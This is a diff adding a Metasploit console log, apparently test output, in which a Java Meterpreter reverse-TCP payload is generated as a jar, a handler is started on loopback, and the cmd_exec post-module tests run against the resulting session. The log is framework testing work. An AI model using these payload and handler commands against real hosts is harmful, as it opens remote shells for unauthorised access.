@@ -1,0 +1,31 @@
+use java/meterpreter/reverse_tcp
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220128-2073-1r37vz3.jar -f jar spawn=0 lport=6026 lhost=127.0.0.1
+[*] Writing 5265 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220128-2073-1r37vz3.jar...
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 24
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6026 
+[*] Sending stage (58082 bytes) to 127.0.0.1
+[*] Meterpreter session 25 opened (127.0.0.1:6026 -> 127.0.0.1:49475 ) at 2022-01-28 20:18:44 +0000
+use test/cmd_exec
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> run session=25 addentropy=true verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: osx
+[!]  * missing Meterpreter features: stdapi_railgun_api, stdapi_fs_chmod
+[*] Running against session 25
+[*] Session type is meterpreter and platform is osx
+[*] Starting cmd_exec tests
+[+] should return the result of echo
+[+] should return the full response after sleeping
+[+] should return the full response after sleeping
+[+] should return the result of echo 10 times
+[*] Finished cmd_exec tests
+[*] Starting cmd_exec quote tests
+[+] should return the result of echo with single quotes
+[+] should return the result of echo with double quotes
+[*] Starting cmd_exec stderr tests
+[+] should return the stderr output
+[*] Testing complete in 4.230598
+[*] Passed: 7; Failed: 0
+[*] Post module execution completed
